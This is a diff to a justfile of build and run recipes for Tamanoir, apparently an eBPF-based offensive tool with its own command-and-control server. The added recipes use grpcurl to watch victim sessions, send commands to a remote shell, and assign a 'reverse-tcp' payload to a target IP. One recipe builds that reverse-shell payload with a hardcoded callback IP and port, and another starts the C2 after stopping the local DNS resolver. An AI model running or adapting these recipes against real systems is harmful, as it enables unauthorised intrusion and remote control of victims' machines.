@@ -4,7 +4,7 @@ _default:
 
 
 _build-ebpf:
-    cd ebpf && cargo build --release
+    cd tamanoir-ebpf && cargo build --release
 
 
 # Build Tamanoir
@@ -17,28 +17,34 @@ build-c2:
     cargo build -p tamanoir-c2 --release
 
 # Run Tamanoir
-run proxy_ip hijack_ip="8.8.8.8" layout="1" log_level="info":
+run proxy_ip="192.168.1.15" hijack_ip="8.8.8.8" layout="1" log_level="info":
     RUST_LOG={{log_level}} sudo -E target/release/tamanoir --proxy-ip {{proxy_ip}} --hijack-ip {{hijack_ip}} --layout {{layout}}
 
-# Run the C&C server
-c2 rce="hello" target_arch="x86_64" dns_ip="8.8.8.8" port="53" payload_len="8" log_level="info" :
-    RUST_LOG={{log_level}} sudo -E ./target/release/tamanoir-c2  --port {{port}} \
-    --dns-ip {{dns_ip}} \
-    --payload-len {{payload_len}} \
-    --rce {{rce}} \
-    --target-arch {{target_arch}}
+# Talk to the C&C server
+c2_list_rce c2ip="192.168.1.15":
+    grpcurl -plaintext  -proto tamanoir-common/proto/tamanoir/tamanoir.proto -d '{}' '{{c2ip}}:50051' tamanoir.Rce/ListAvailableRce
+c2_list_services c2ip="192.168.1.15":
+    grpcurl -plaintext  -proto tamanoir-common/proto/tamanoir/tamanoir.proto  '{{c2ip}}:50051' list 
+c2_watch c2ip="192.168.1.15":
+    grpcurl -plaintext  -proto tamanoir-common/proto/tamanoir/tamanoir.proto -d '{}' '{{c2ip}}:50051' tamanoir.Session/WatchSessions
+c2_remote_shell_watch c2ip="192.168.1.15":
+    grpcurl -plaintext  -proto tamanoir-common/proto/tamanoir/tamanoir.proto -d '{}' '{{c2ip}}:50051' tamanoir.RemoteShell/WatchShellStdOut
+c2_remote_shell_cmd c2ip="192.168.1.15" cmd="ls -l":
+    grpcurl -plaintext  -proto tamanoir-common/proto/tamanoir/tamanoir.proto -d '{"message":"{{cmd}}"}' '{{c2ip}}:50051' tamanoir.RemoteShell/SendShellStdIn
+c2_set_rce c2ip="192.168.1.15" session_ip="192.168.1.180" rce="reverse-tcp":
+    grpcurl -plaintext  -proto tamanoir-common/proto/tamanoir/tamanoir.proto -d '{"ip":"{{session_ip}}","target_arch":"x86_64","rce":"{{rce}}"}' '{{c2ip}}:50051' tamanoir.Rce/SetSessionRce
+c2_delete_rce c2ip="192.168.1.15" session_ip="192.168.1.180":
+    grpcurl -plaintext  -proto tamanoir-common/proto/tamanoir/tamanoir.proto -d '{"ip":"{{session_ip}}" }' '{{c2ip}}:50051' tamanoir.Rce/DeleteSessionRce
 
+#run c2 server
+c2_run:
+    sudo systemctl stop systemd-resolved && RUST_LOG=debug sudo -E ./target/release/tamanoir-c2 start
 
-
-
-_build-rce payload="hello":
-    cd rce &&  just build {{payload}} && cargo build  --release
-
-_run-rce:
-    cd rce && sudo -E target/release/tamanoir-rce
-
-_build_reverse_shell proxy_ip="192.168.1.15" rce_port="8082":
-    IP=$(just _atoi {{proxy_ip}}) PORT={{rce_port}} just _build-rce reverse-tcp
+#rce build (run on c2 server)
+rce_build_reverse_tcp :
+    ./target/release/tamanoir-c2  rce  build  -c ./assets/payloads/reverse-tcp  -b "IP=192.168.1.15 PORT=8082"
+rce_build_hello :
+    ./target/release/tamanoir-c2  rce  build  -c ./assets/payloads/hello
 
 
 _atoi ipv4_address:
